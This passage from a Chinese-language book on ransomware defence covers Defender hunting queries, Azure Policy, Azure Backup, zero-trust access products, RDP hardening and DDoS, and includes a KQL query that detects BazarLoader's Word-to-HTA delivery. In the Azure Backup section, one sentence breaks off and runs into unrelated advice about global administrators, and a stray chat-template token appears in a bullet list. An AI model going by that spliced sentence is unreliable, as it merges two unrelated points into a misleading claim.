  \ Windows Server 版本可用的不同功能：https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-server-endpoints。\n\
  \n所有收集的数据也可以原始格式查看，如果我们进入门户的 **搜寻** 部分并点击 **高级搜寻**。这将带我们进入一个查询窗口，在这里我们可以运行 Kusto\
  \ 查询，类似于我们使用 Microsoft Sentinel 所做的。\n\n例如，我们可以使用此功能来查找 BazarLoader 的 Word 文档传递方法，该方法通常利用\
  \ Word 创建一个 `.hta` 文件，以在机器本地启动，如下所示：\n\n```\nDeviceProcessEvents | where InitiatingProcessFileName\
  \ =~ 'WINWORD.EXE' and FileName =~ 'cmd.exe' and ProcessCommandLine has_all('hta')\n\
  ```\n\nDefender 收集大量与操作系统相关的数据，包括文件更改、机器上的进程以及 Windows 注册表的更改。它还收集每台设备上的所有入站和出站网络连接。这使我们能够查看机器上的大部分通信流，例如查看在给定时间哪个服务正在与网络上的另一台计算机通信。它不收集安全事件，因为这是由其他服务（如\
  \ Sentinel）完成的。\n\n应注意，默认情况下，Defender 服务将数据存储 180 天；但是，如果您希望将数据存储更长时间，可以启用 Microsoft\
  \ Sentinel 中名为 Microsoft 365 Defender 的数据连接器。这将在 Sentinel 数据库中创建 Defender 数据库中所有原始日志的副本。但是，应注意，复制这些原始日志可能会显著增加日志使用量和服务成本。\n\
  \n## Azure Policy\n\n如前所述，Azure Policy 可以帮助我们提供对 Azure 资源的集中控制。策略可以应用于资源创建，也可以在资源创建完成后进行评估，这最常见于虚拟机中的来宾配置。\n\
  \n策略可以通过以下方式部署：\n\n- 审核模式\n- 拒绝模式\n- 如果不存在则审核\n- 如果不存在则部署\n\n我收到的一个常见请求是确保没有人能在\
  \ Microsoft Azure 中部署带有公共 IP 地址的资源。这是为了降低面向互联网的资源（如虚拟机）被攻陷的风险。\n\n带有公共 IP 地址且没有安全机制的虚拟机，在设置后的第一个小时内就会受到暴力破解攻击的轰炸。\n\
  \n因此，我们需要确保应从互联网访问的资源只能通过其他安全机制访问，例如根据服务使用 Azure Bastion 或 Application Gateway。\n\
  \n使用 Azure Policy，您可以确保没有人使用预定义的策略定义部署带有公共 IP 地址的资源。您可以在以下屏幕截图中找到名为 **网络接口不应具有公共\
  \ IP** 的定义。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_175_0.png)\n\n图5.15 – Azure\
  \ Policy 定义\n\n然后，点击该策略并选择 **分配**。在 **范围** 下，您可以定义要应用此策略的级别，可以是资源组、订阅或管理组。我们还可以在分配策略时定义一个不合规消息，当有人触发策略违规时，我们可以定义更具描述性的消息，而不是默认消息。这可以在分配策略时的\
  \ **不合规消息** 选项下定义。\n\n定义范围并可选地定义不合规消息后，点击 **查看 + 创建**，然后点击 **创建**。\n\n如果有人试图在应用了该策略的网卡上附加公共\
  \ IP，或者试图创建具有公共 IP 地址的新虚拟机，他们将收到类似以下屏幕截图所示的消息。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_176_0.png)\n\
  \n*图5.16 – Azure Policy 拒绝公共 IP*\n\n还有大量其他预定义策略可用于为您的 Microsoft Azure 环境添加更多治理。例如，有一个策略可以根据机器具有的标记自动将机器添加到备份策略。这确保了如果有人忘记将机器添加到备份策略，如果机器上有预定义标记，该策略将自动处理。\n\
  \n门户中可用的所有策略也可以在 Microsoft 的 GitHub 页面上查看：https://github.com/Azure/azure-policy/blob/master/built-in-policies/policyDefinitions/，其中许多策略也是\
  \ Microsoft 作为示例提供的企业规模登陆区域参考架构的一部分。\n\n现在，让我们仔细看看 Azure 中虚拟机的备份功能。在应对勒索软件时，最显著的功能之一是确保您拥有工作负载的备份，并且在需要时可以轻松恢复。\n\
  \n## Azure Backup\n\n默认情况下，当您在 Azure 中设置虚拟机时，存储在其中的所有数据都会在同一数据中心内自动复制三次。这也称为 **本地冗余存储\
  \ (LRS)**，这是为了确保数据的可用性。\n\n如果我们的机器感染了勒索软件，在 Azure 中加密我们的数据，复制机制将启动并同样复制该数据三次。因此，重要的是要了解此功能并不能替代对数据进行备份的需求。\n\
  \n在 Azure 中，Microsoft 提供了一项备份服务，可以备份虚拟机工作负载，并将数据存储在单独的存储账户中。此存储账户只能从备份服务访问，默认情况下，静态备份数据使用\
  \ **平台托管密钥 (PMKs)** 加密。此外，该服务还具有软删除机制，这意味着无法清除/\n\n\n删除或覆盖服务正在备份的数据。这确保了勒索软件无法破坏服务已备份的数据。\n\
  \n因此，如果你的 Azure 环境不幸遭到勒索软件入侵，你可以轻松地从 Azure Backup 服务恢复虚拟机，并确保备份数据未受影响。\n\nAzure\
  \ Backup 服务还支持备份其他数据源，例如：\n\n- 本地文件、文件夹和系统状态\n- Azure 托管磁盘\n- Azure 文件共享（Azure 中的\
  \ SMB 文件服务）\n- Azure PostgreSQL\n- Azure Blob 存储（Azure 中的对象存储服务）\n\n可以通过 Azure 门户为虚拟机启用备份：进入\
  \ VM 对象，然后点击“备份”选项。在这里，我们可以自动创建备份保管库并定义备份策略。备份保管库是一种逻辑资源，提供备份服务的管理平面，包括管理备份数据所在的存储帐户。\n\
  \n你有两种不同的备份策略类型可供选择：\n\n- 标准（每 24 小时备份一次，基于 LRS 的快照）\n- 增强（每天多次备份，基于 ZRS 的快照层，并支持使用第\
  \ 2 代虚拟机的受信任 Azure VM）\n\n> **注意**\n> **ZRS** 代表**区域冗余存储**，这意味着数据在同一地理区域内的三个不同数据中心之间复制三次，以确保在其中一个物理数据中心发生故障时数据仍然可用。\n\
  \n创建服务和策略后，可以在名为 Azure Backup center 的服务中集中管理备份和还原功能。\n\n此外，如果你已建立了包含多个订阅的企业登陆区结构，则必须为每个订阅设置单独的备份保管库，以确保全面的备份和还原能力。这是因为备份保管库只能从同一订阅内的资源进行备份。\n\
  \n虽然许多人可能熟悉其他备份服务具有内置机制来自动验证备份中的数据，但截至目前，Azure Backup 中还没有这样的功能。\n\n作为 Azure Backup\
  \ 的一部分，在还原数据方面我们有一些不同的选项。我们可以使用备份数据在与 control/elevate-access-global-admin 相同的订阅中创建新的虚拟机。因此，请确保你也限制全局管理员帐户的数量。如果你想在\
  \ Azure AD 内委派访问权限，请使用 Azure AD 管理单元等功能。\n\n- 如果你想在 Microsoft Azure 中将 PaaS 服务与虚拟机结合使用，请确保使用专用终结点部署这些服务。这可以确保\
  \ PaaS 服务和连接保持在 Azure 虚拟网络内，而不是公开暴露。\n- 确保所有虚拟机都安装了终结点保护、更新管理和 Log Analytics/Azure\
  \ Monitor 代理。其次，安全日志应收集到集中的 Log Analytics 工作区中，并启用 Microsoft Sentinel 或第三方 SIEM\
  \ 服务。\n- 使用 Azure Bastion 等服务为管理员提供对虚拟机的安全远程访问，而不是让跳板机对外可用。Azure Bastion 还支持按 IP\
  \ 连接，这意味着你也可以使用它连接到本地资源。\n- 确保为你的 Azure 环境应用 Azure 策略，以降低发布面向互联网的不安全服务或服务日志记录机制不足的风险。例如，确保服务只能在批准的区域中预配，只能放在集中式安全机制之后，并且启用日志记录。\n\
  \n这些是你在 Azure 中构建工作负载时应遵循的一些建议。需要注意的是，Azure 在不断变化，因此你应该始终重新评估你的 Azure 环境是否按照基于 Microsoft\
  \ 云安全基准的最佳实践运行，你可以在此处阅读更多相关信息：https://learn.microsoft.com/en-us/security/benchmark/azure/overview?source=recommendations。\n\
  \n## 总结\n\n随着越来越多的组织将工作负载迁移到 Microsoft Azure，我们必须深入了解可用的各种服务和机制，以确保我们拥有安全的基础。\n\n\
  在本章中，我们深入探讨了如何设计基于 Azure 的环境，以及为确保能够控制其中预配的虚拟机资源而应具备的一些核心组件。\n\n我们了解了一些核心服务，例如 Azure\
  \ Policy、Azure 更新管理和 Azure Backup，以及如何使用它们来保护我们在 Azure 中的虚拟基础架构。\n\n在下一章中，我们将更深入地探讨如何在遵循零信任原则的同时，为用户提供对应用程序和服务的安全访问，以及如何将风险和威胁信息集成到访问管理中。\n\
  \n最后，我们将研究有助于保护流量免受各种攻击的不同机制。\n"
- "## 勒索软件对策——网络与零信任访问\n\n正如我在第一章中提到的，大多数勒索软件攻击要么始于受感染的设备，要么始于外部可访问的易受攻击的服务（如 VPN\
  \ 或 VDI），攻击者随后会利用这些服务。\n\n无论如何，大多数此类攻击都为攻击者提供了可乘之机，并为他们提供了进一步访问基础架构的途径。\n\n如果最终用户设备无法访问基础架构，或者服务不对外部开放，那么大多数此类攻击都可以被阻止。\n\
  \n因此，在本章中，我们将基于零信任访问模型，探讨如何确保用户和管理员能够安全地从外部访问服务，而不会面临同样的风险。\n\n我们还将探讨一些有关基于 Windows\
  \ 的工作负载的网络分段和安全最佳实践，以及如何保护我们的外部 Web 服务免受分布式拒绝服务（DDoS）攻击，这种攻击媒介我们越来越常见。\n\n最后，我们将研究一些\
  \ SASE 服务模型，以及它们如何帮助降低移动办公人员的风险。\n\n在本章中，我们将涵盖以下主题：\n\n- 零信任网络访问和 SASE 服务\n- 网络分段、防火墙和访问\n\
  - DDoS 防护和针对新 Web 服务的防护\n\n## 攻击者与横向移动\n\n在第 1 章“勒索软件攻击向量与威胁格局”中，我们介绍了一些不同的勒索软件变种及其工作原理。在大多数情况下，攻击始于攻击者用来对网络和基础架构进行侦察的终结点。\n\
  \n然后，攻击者通常会结合多种方式进一步访问基础架构：\n\n- 重用终结点上发现的凭据，使用远程桌面协议（RDP）登录服务器\n- 使用 Bloodhound\
  \ 等工具查找 Active Directory 中通往管理员帐户的攻击路径\n- 利用 Zerologon 等漏洞\n- 使用 Rubeus 等工具执行 Kerberoasting\
  \ 攻击\n- 使用 Invoke-ShareFinder 等模块查找网络共享和敏感内容\n\n不幸的是，我们还遇到过 PrintNightmare 等漏洞，这些漏洞使能够访问终结点的黑客可以轻松入侵打印服务器或运行打印后台处理程序服务的服务器。\n\
  \n现在，这些侦察和横向移动之所以成为可能，很大程度上是因为 Active Directory 域的基础架构加上某种形式的漏洞。\n\n在大多数组织中，最终用户的\
  \ Windows 机器需要与许多不同的内部服务通信，例如文件服务、打印服务、域控制器和 PKI 服务等。\n\n在大多数情况下，攻击者无法直接从受感染的终结点访问域控制器，除非存在某种漏洞或配置错误的服务可供他们利用进行横向移动。另一种情况是，攻击者设法获得了高特权帐户的凭据，而基础架构中用于限制访问的防火墙规则有限。\n\
  \n此外，我们还有 Zerologon 等漏洞，这些漏洞允许攻击者从已加入域的计算机访问域控制器。\n\n许多攻击者使用 Bloodhound 等工具（我们将在本章后面介绍）来绘制环境地图，并识别可能获得域管理员访问权限的不同攻击路径。\n\
  \n因此，采用分层安全方法非常重要，这尤其适用于我们拥有虚拟基础架构的网络。\n\n正如我们在 Microsoft Azure 的网络设计中所介绍的那样，我们可以使用中心辐射型网络拓扑来分段网络，这涉及拥有多个\
  \ VLAN/区域，并通过集中式防火墙路由所有流量。\n\n\n\n\n有了这些区域，我们就可以使用集中式安全服务（如防火墙）来确保这些区域之间的通信安全，并使攻击者更难到达我们基础设施的核心。\n\
  \n在我们深入探讨网络分段之前，我们将重点关注为终端用户提供对服务的访问安全。\n\n## 为用户提供对服务的安全访问\n\n在大多数情况下，我们的终端用户通过某些服务（如\
  \ Always On VPN）以某种形式的远程访问方式访问基础设施。这确保了他们的终端可以与文件服务器、打印服务器、Active Directory 以及不同应用程序所需的其他网络协议（如\
  \ TCP/UDP）进行通信。\n\n现在使用 Always On VPN 或其他第三方服务的原因是，它为终端用户提供了与在办公室相似的体验。这使他们能够在自己的机器上登录并自动通过\
  \ VPN 隧道连接到基础设施，提供无缝的用户体验。\n\n许多这些 VPN 服务还提供 **网络准入控制 (NAC)** 功能，在设备被允许进行身份验证或在\
  \ VPN 隧道中发送流量之前检查设备的健康状况。\n\n然而，在大多数情况下，这些检查可能相当有限，其次，一旦 VPN 隧道激活，终端基本上就被视为办公室内部的机器，可以访问大多数内部服务。\n\
  \n> **注意**\n> \n> 我还遇到过另一种情况，攻击者成功入侵了一台已注册到 AAD 的服务器，随后利用它对基础设施的其他部分发起攻击。您可以在此处阅读更多相关内容：`https://msandbu.org/the-curious-case-of-azure-managed-identity-and-a-compromised-virtual-machine/`。\n\
  \n我遇到过这样一种情况，一家客户的 VPN 服务允许其员工在疫情期间在家访问企业基础设施。然而，他们忘记打开与 Windows Server Update Services\
  \ 的通信，因此大多数机器无法进行补丁更新，但仍然可以完全访问其公司的基础设施。\n\n因此，我们需要寻找一种新的方式来为用户提供对内部服务的安全访问，而不会像使用\
  \ VPN 服务或其他需要维护的外部服务那样承担同等风险。\n\n许多安全厂商现在更倾向于推动基于零信任的模型来提供访问。正如 *第 2 章，建立安全基础* 中所述，目标是防止未经授权访问数据和服务，同时尽可能细化访问控制执行。以\
  \ VPN 为例，终端不应获得对网络的完全访问权限，而应仅在需要时获得对特定服务的访问权限。能够为用户提供基于零信任的访问的服务通常被称为 **零信任网络访问\
  \ (ZTNA)**。\n\n当用户尝试连接到服务时，ZTNA 产品可以根据配置检查以下内容：\n\n- 设备是否安全？是否已更新？是否已实施必要的<|message|>\
  \ 安全配置？\n- 用户是否来自已知位置？用户是否使用 MFA 进行身份验证？\n- 这是正常用户行为还是异常行为？\n- 用户是否已定义对该服务的访问权限？\n\
  \n因此，让我们来看一些用户访问内部服务的访问权限如何区分的示例：\n\n- 用户 1 尝试从已知位置访问内部 Web 应用程序\n- 用户 1 设备已实施安全基线，其中包括已安装防恶意软件且已启用端点检测与响应\
  \ (EDR) 代理\n- 在用户 1 完成 MFA 提示后，授予其访问权限\n- ZTNA 服务会不断评估状态是否发生变化，例如用户位置或设备风险\n\n让我们再看另一个用户，他正尝试从未知设备或未实施必要安全配置的设备登录：\n\
  \n- 用户 2 尝试从已知位置访问内部 Web 应用程序\n- 用户 2 设备未实施任何安全配置，且设备上的防恶意软件和 EDR 已被禁用\n- 根据其身份和设备态势以及访问策略的组合，用户\
  \ 2 未被授予对该服务的访问权限\n\n现在，虽然零信任和不同的支柱是一组安全设计原则，但要实现 ZTNA 必须依赖于一套特定的技术。正如我提到的，市场上有大量厂商提供所谓的\
  \ ZTNA 服务，以确保您可以在用户访问服务或数据之前验证用户及其设备、属性和上下文。\n\n这也是我们提供访问方式的改变，因为用户默认不应具有对内部服务的显式访问权限（如基于\
  \ AD 的计算机，一旦经过身份验证，本质上就具有对内部资源的显式访问权限）。因此，如果您想实施基于零信任的安全架构，您应考虑将受管终端迁移到 Azure AD。\n\
  \n虽然许多优秀的厂商提供许多相同的功能，但我将在本章中介绍市场上三种不同的厂商，介绍它们提供哪些功能，以及这些功能如何帮助降低勒索软件风险。\n\n## Microsoft\n\
  \n现在，如果我们开始查看不同的厂商，Microsoft 拥有一个众所周知的技术栈，可以解决我们为内部服务提供安全访问的大部分需求，例如操作员访问、终端用户访问或只是对内部\
  \ Web 应用程序的普通访问。\n\nMicrosoft 提供了多种不同的服务，如下图所示，但其中大多数服务仅在运行 Microsoft Azure 或使用\
  \ Azure 服务时可用：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_186_0.png)\n\n图 6.2 –\
  \ Microsoft 安全访问服务概览\n\n核心是 Azure AD 用于身份态势，以及 Intune 和 Defender 用于设备上下文。这些产品具有不同的异常检测机制来验证用户和设备的健康状况。然后，这些信息由条件访问处理，后者将确定您是否被允许访问该服务。\n\
  \n然后，我们有一系列可以让用户访问这些不同服务的服务：\n\n- Azure AD：提供对已集成 Azure AD 的 Web 应用程序的原生访问。\n- Azure\
  \ Application Proxy：通过 Azure AD Application Proxy Connector 发布内部 Web 应用程序，提供对这些应用程序的访问。这些应用程序随后可通过\
  \ MyApps 或 Office 365 用户门户使用。\n- **Azure Bastion：** Bastion 是使用 RDP 或 SSH 访问跳板机或服务器的方式。Microsoft\
  \ 还最近引入了 *Connect to IP* 和 *Native Client Support*，这使我们能够使用 Bastion 通过 IP 地址直接或使用机器上的原生\
  \ RDP 客户端连接到机器，结合通过 Azure Bastion 服务的反向隧道，而不是 Web 门户。\n- **Azure Virtual Desktop/Windows\
  \ 365：** 为终端用户提供 VDI 服务，要么使用 Windows 10/11 的 1:1 设置，要么在 Azure 中提供多会话支持。\n- **Azure\
  \ VPN：** Azure VPN，顾名思义，是 Azure 原生的 VPN 服务，可用于将本地环境连接到 Azure，但它也支持 **点到站点 (P2S)**\
  \ 配置，以便客户端可以使用其 Azure AD 凭据连接到 VPN 服务。此功能仅限于 Windows。它支持条件访问以验证上下文，但它仍然会打开到基础设施的完整\
  \ VPN 隧道。\n- **Azure Arc：** Arc 是 Microsoft 提供混合服务和功能的新方式，也已引入支持，只要服务器已连接到 Azure\
  \ Arc，您就可以连接到任何启用了 SSH 的设备。因此，它在设备和 Arc 之间建立反向隧道来处理流量。\n- **Microsoft Tunnel：**\
  \ Tunnel 是一款面向移动设备的 VPN 服务，内置于 iOS 和 Android 的 Microsoft Defender 应用中。VPN 服务本身作为容器运行，但也支持基于\
  \ Azure AD 的身份验证。\n\n其中大多数服务还通过 Microsoft Azure 使用反向隧道，这意味着它们不会公开暴露服务或端点（Azure VPN\
  \ 和 Microsoft Tunnel 除外）。这降低了攻击者利用外部服务已知漏洞的风险。\n\n需要注意的是，并非所有这些服务都提供细粒度的访问检查——例如，Azure\
  \ VPN 没有机制在 Intune 检测到用户终端存在风险时断开会话。\n\n但作为一个例子，如果我们使用 Azure Virtual Desktop 而不是直接将服务器通过\
  \ RDP 发布到互联网，这将极大地降低网络攻击的风险。\n\n## Citrix\n\n许多组织今天使用 Citrix 来提供对 VDI 环境的远程访问，而\
  \ Citrix 在过去几年中不幸地遭受了与其网关设备相关的许多严重漏洞，许多攻击者已知会利用这些漏洞。\n\n阅读更多内容：https://www.cisa.gov/known-exploited-vulnerabilities-catalog。\n\
  \nCitrix 还在云平台 Citrix Cloud 上构建了越来越多的服务，并最近引入了名为 Secure Private Access 的新功能，这是一项仅限云的服务，如下图所示：\n\
  \n\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_188_0.png)\n\n图 6.3 – Citrix Secure\
  \ Private Access 概览\n\nCitrix Secure Private Access 可以使用不同的身份提供方 IDP，例如 Azure AD\
  \ 或原生 SAML，或其自有的身份验证机制，称为 Adaptive Authentication，可与终端访问机制结合使用来验证身份态势。\n\n其次，作为\
  \ Secure Private Access 的一部分，Citrix 还可以使用内置代理 Citrix Secure Access 进行设备态势检查。这种方法的缺点是内置代理无法使用来自第三方\
  \ MDM 工具或 EDR 工具的信息来进行终端的设备上下文检查，这意味着如果您使用 CrowdStrike 进行 EDR，在确定是否应授予用户访问权限时，Citrix\
  \ Cloud 无法原生访问在那里收集的信息。\n\nCitrix 还包含 Citrix Analytics，可提供会话上下文，了解用户在 VDI 会话中正在做什么，例如，如果\
  \ Analytics 检测到 VDI 会话中的异常用户行为，您可以创建策略自动断开会话。这确保了如果攻击者能够获得访问权限，他们无法在 VDI 会话中进行任何恶意活动。\n\
  \nCitrix 还具有 Secure Browser 功能，可让您在浏览器会话上提供更多安全控制机制（随着新传输协议的出现，这变得越来越困难）。从用户角度来看，他们可以使用现有的\
  \ Citrix Workspace 应用访问内部服务。\n\n## Cloudflare\n\nCloudflare 历史上以提供保护 Web 服务的服务而闻名，最近已通过其零信任产品更多地进入终端用户生态系统。与市场上其他厂商相比，Cloudflare\
  \ 最大的主要区别在于他们没有自己的 IDP 或 EDR 服务，就像微软拥有 Defender for Endpoint 一样，因此他们专注于提供灵活性并与不同的第三方提供商集成，如以下屏幕截图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_189_0.png)\n\n图 6.4 – Cloudflare EDR\
  \ 和终端设备检查\n\nCloudflare 例如可以使用 Azure AD 作为 IDP 获取用户上下文，并使用 Carbon Black 收集设备上下文。能够与许多不同的提供商集成使其在设备和身份上下文方面非常灵活。\n\
  \n现在，与 Microsoft 和 Citrix 不同，Cloudflare 没有任何 VDI 服务，但确实提供对内部服务、TCP/UDP、SSH/RDP 和基于\
  \ Web 的服务的访问，使用 Warp 和一个名为 **Cloudflared** 的服务器组件。cloudflared 是安装在我们基础设施中运行的虚拟机上的服务名称。从终端用户角度来看，Warp\
  \ 代理连接到 Cloudflare 网络，如 *图 6.5* 所示。然后，Cloudflare 守护进程在内部服务器上运行，可以在 Windows、Linux\
  \ 或作为容器运行，如下图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_189_1.png)\n\n图 6.5\
  \ – Cloudflare 零信任概览\n\nSASE 平台的核心组件之一是 CASB，这是一种产品通常使用与不同云服务（如 SaaS）的 API 集成来监控该服务内的活动。\n\
  \n这当然要求 CASB 提供商根据可用的 API 类型为特定的 SaaS 方案构建支持。大多数 CASB 提供商支持大型 SaaS 方案，如 Microsoft\
  \ 365、ServiceNow、Workday 和 Salesforce，但如果您有一个小型自定义 SaaS 方案，很可能无法集成 CASB 产品。\n\n\
  虽然 CASB 是堆栈的一部分，第二部分是 SWG，您可以将其视为所有出站网络流量的反向代理。它更侧重于保护用户免受互联网上的恶意内容。在大多数情况下，使用 SWG\
  \ 时，所有互联网流量都将通过提供商的接入点 PoP 路由，在那里他们将检查您尝试访问的任何站点的 URL、目标和内容。有时，这些安全提供商还使用浏览器扩展或插件来更深入地了解流量流。\n\
  \n结合此功能，提供商还具有 SD-WAN 功能，旨在为终端用户提供更智能的互联网流量路由，或作为分支机构的解决方案。\n\n所有这些组件共同构成了 SASE\
  \ 方案。我们可以看到越来越多的安全厂商进入这一生态系统，单一厂商提供完全集成的服务。\n\n我提到 SASE 的原因是，当它在市场上变得更加成熟时，它将能够为移动用户提供更好的安全性，因为它将允许通过\
  \ CASB 实现对云服务的更好可见性，通过 SWG 提供更主动的安全性，当然，还能够使用 ZTNA 提供对内部服务的安全访问。\n\n## 文件访问\n\n\
  最常用的服务之一，大多数远程用户需要访问的是文件共享或文件服务器上自己的个人存储区域，这不幸的是勒索软件传播最常见的方式之一。\n\n因此，就勒索软件对策而言，用不运行在\
  \ SMB 上的替代方案移除或替换文件共享，同时仍能以零信任为目标在外部访问，这是一种有效降低风险的方法。\n\n常见的设置是将数据从本地文件服务迁移到基于云的服务，例如以下：\n\
  \n- OneDrive（SharePoint/Microsoft Teams）\n- Google Drive\n- Dropbox\n\n这至少可以在勒索软件脚本和工具能够加密的哪种数据方面降低影响。\n\
  \n此外，其中一些服务，如 OneDrive，支持各种加密机制，这意味着如果有人设法访问文件或内容，他们在解密之前将无法读取实际内容。这也确保了勒索软件攻击者无法基于文件数据或敏感信息对您进行勒索。\n\
  \n虽然基于云的存储可以适用于许多文件场景，但您可能有需要访问快速本地存储的内部服务器或应用程序的场景。\n\n我曾经与一家客户合作，他们的硬件开发团队最近遭受了勒索软件攻击。现有环境是一组标准的域加入\
  \ Windows 机器连接到本地文件服务器，因此我们做了一些工作，让他们能够更远程地工作并降低未来攻击的风险。\n\n他们的机器迁移到了 Azure AD，并且他们个人存储中的大部分文件都迁移到了\
  \ OneDrive 和 Teams。然而，最后一个缺失的部分是他们用于开发的应用程序需要访问快速本地存储，因为它包含应用程序需要访问的大文件。\n\n困难之处在于他们使用的应用程序需要集成文件资源管理器访问现有文件服务器才能正常工作。然而，由于他们的机器已迁移到\
  \ Azure AD，我们希望消除引入新的 SMB 文件服务器的风险，对于此场景，我们评估了一些支持其要求的第三方选项。\n\n我也想在此强调一些替代方案：\n\
  \n- **Fileflex：** 这提供了 Azure AD 集成的访问现有内部存储服务，如 FTP、SharePoint On Premises、NAS 和其他本地\
  \ SMB 共享\n- **Egnyte：** 这提供了自己的存储服务，支持与本地基础设施集成以及与不同 IDP 集成以提供 MFA 访问\n\n这些都支持基于云的存储和混合存储，与\
  \ Azure AD 集成用于身份验证，并与 Windows 文件资源管理器集成（使用或不使用 SMB 协议）。\n\n将您的存储从基于 SMB 的文件服务移开也会降低攻击者能够影响您文件风险。大多数勒索软件团伙利用基于脚本和基于工具的方法来定位和加密\
  \ SMB 共享上的文件。值得注意的是，许多基于云的存储服务提供版本化文件和数据功能，这有助于在必要时更轻松地恢复文件。然而，值得注意的是，基于云的存储在很大程度上未受到勒索软件攻击的影响。\n\
  \n> **注意**\n> Microsoft 在 Microsoft Azure 中提供大量不同的存储选项，但其中没有一个支持本地部署。一个选项是 Azure\
  \ File Sync，它在本地文件服务器和 Microsoft Azure 之间复制数据。此功能仍使用常规 Windows 文件服务器、AD 和 SMB 协议。\n\
  \n\n\n\n\n## 远程管理服务\n\n在我遇到的大多数勒索软件案例中，攻击者都能够利用 RDP 访问并在企业网络内部的服务器之间跳转。微软也在其年度报告\
  \ *Microsoft Digital Defence Report 2022* 中指出，该报告可在此处找到 – https://www.microsoft.com/en-us/security/business/microsoft-digital-defense-report-2022\
  \ – RDP 也是勒索软件攻击的主要攻击向量之一。\n\n**注意**\nRDP 代表勒索软件部署协议 Ransomware Deployment Protocol\
  \ 是一个常见的玩笑，但其中有些是真实的。根据 Shodan 的数据，互联网上有超过 400 万台服务器启用了 RDP 并且可以公开访问。\n\nRDP 的问题在于默认情况下没有任何内置的\
  \ MFA 机制。你可以通过其他 **远程桌面服务 (RDS)** 功能，例如 RDS 网关，它是 Windows Server 的一部分，使用 MFA 发布\
  \ RDP。\n\n使用 RDS 网关在外部发布它，所有 RDP 流量将通过网关代理，该网关使用 TCP 443（和 UDP 3391）。RDS 网关可以通过\
  \ NPS 服务器角色使用 MFA 进行配置，但这仍然要求你将 RDS 网关暴露给互联网以提供远程访问。\n\n同样，在公共云上设置 Windows 服务器时，云提供商总是几乎过于轻松地设置一台具有公共\
  \ IP 地址并启用 RDP 进行远程管理的机器。这不幸地产生了一个副作用，即该机器成为暴力攻击的热门目标，而这些攻击几乎可以在机器可用后的几分钟内针对。\n\n\
  因此，重要的是要尽量减少 RDP 的使用，降到最低限度，不仅用于服务器管理，也用于远程访问。你在任何情况下都不应让 RDP 服务器公开可用。\n\n关于 Windows\
  \ 基础架构的远程管理，你应实施以下措施：\n\n- 确保对于需要启用 RDP 的服务器，你已启用 **网络级身份验证 (NLA)**。NLA 在连接建立之前提供额外的身份验证级别，并且在\
  \ Server 2012 R2 及更高版本中默认启用。\n- 确保你已为需要启用 RDP 的服务器禁用驱动器映射和剪贴板映射。这是因为勒索软件运营商经常使用剪贴板功能将文件从受感染的机器复制到目标服务器。\n\
  - 确保对于需要 RDP 访问的服务器，你限制可以登录的用户和组类型。默认情况下，本地管理员和远程桌面用户被允许登录。这里的一个最佳实践是删除管理员通过 RDP\
  \ 登录的能力。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_195_0.png)\n\n这也应在中央防火墙上实施，但也在主机级别执行的原因是为了阻止来自同一子网或防火墙区域内服务器的访问。\n\
  \n在这里，我们创建一个自定义规则，因为它给了我们定义端口和应适用到的 IP 范围的选项。\n\n确保你也删除可能将 RDP 打开到更广范围或其他范围的防火墙规则，这些范围位于管理或跳板主机服务器之外。默认情况下，Windows\
  \ Defender 防火墙会阻止所有传入网络流量，除非它与允许流量的规则匹配。因此，添加入站规则意味着只有来自定义网络的 RDP 流量才会被允许。\n\n虽然启用\
  \ RDP 应被视为最后的手段，但微软也引入了新的功能，使无需使用 RDP 即可更轻松地进行远程管理。其中一个选项是 Windows Admin Center，它可以被视为\
  \ Windows 中传统 Server Manager 功能的演进，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_196_0.png)\n\
  \n图 6.8 – Windows Admin Center 网页 UI\n\n> > **注意**\n> >\n> > 如果你已在 Microsoft Azure\
  \ 中部署了基础架构，你没有像 VMware/Hyper-V 环境那样使用控制台连接的选项，因此可能需要使用 RDP 来访问虚拟机。在 Azure 中，你也有\
  \ Azure Bastion 服务，这是一个基于 Apache Guacamole 的托管跳板主机服务，你可以通过 Azure 门户通过 RDP 登录到机器。\n\
  \n在这里，管理员可以执行他们需要的大多数任务，而无需使用 RDP 登录。Server Manager 也支持基于 Azure AD 的身份验证。\n\n该产品具有相当简化的架构，其中有两个主要组件，即托管\
  \ UI 的 Web 服务器和通过 PowerShell/WMI over WinRM 与你管理的服务器通信的网关服务器。\n\n虽然 Windows Admin\
  \ Center 减少了使用 RDP 的需求，但它仍然使用 WinRM，并且要求网关服务器能够与网络中的其他服务器通信。然而，使用 Admin Center 并删除使用\
  \ RDP 访问网络中其他服务器的能力，可以大大减少攻击者在你的网络中进行横向移动的影响。\n\n还应注意的是，还有很多优秀的第三方选项可提供通过云服务进行更简单的远程管理功能，以及\
  \ MFA，例如以下：\n\n- **Teleport** – `https://goteleport.com/`\n- **BeyondTrust** - https://www.beyondtrust.com/\n\
  - **JumpCloud** - https://jumpcloud.com/\n\n如果你有 Citrix NetScaler/ADC，你也有使用名为 RDP\
  \ Proxy 的功能发布 RDP 访问的选项，如果你仅需要 RDP 进行一些管理，则无需 RDS 网关。你可以在此处阅读更多相关信息：https://docs.citrix.com/en-us/citrix-gateway/current-release/rdp-proxy.html。\n\
  \n## DDoS 防护\n\n在 2021 年夏季，微软宣布他们阻止了有史以来记录的 *最大 DDoS 攻击之一* – https://www.theverge.com/2021/10/12/22722155/microsoft-azure-biggest-ddos-attack-ever-2-4-tbps\
  \ – 表示他们能够缓解 2.4 TBps 的 DDoS 攻击。\n\n此次攻击是基于 UDP 的反射攻击，虽然时间很短，但肯定会使企业针对的任何外部服务瘫痪。\n\
  \n微软表示大多数 DDoS 攻击时间很短。根据他们收集的统计数据，大多数攻击发生在 5–30 分钟的范围内，如以下屏幕截图所示：\n\n## 攻击持续时间\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_197_0.png)\n\n图 6.9 – DDoS 攻击持续时间统计\n\
  \n此外，Cloudflare 在其最新的 2022 年第二季度 DDoS 攻击趋势文章中，如你在此处查看 – https://blog.cloudflare.com/ddos-attack-trends-for-2022-q2/\
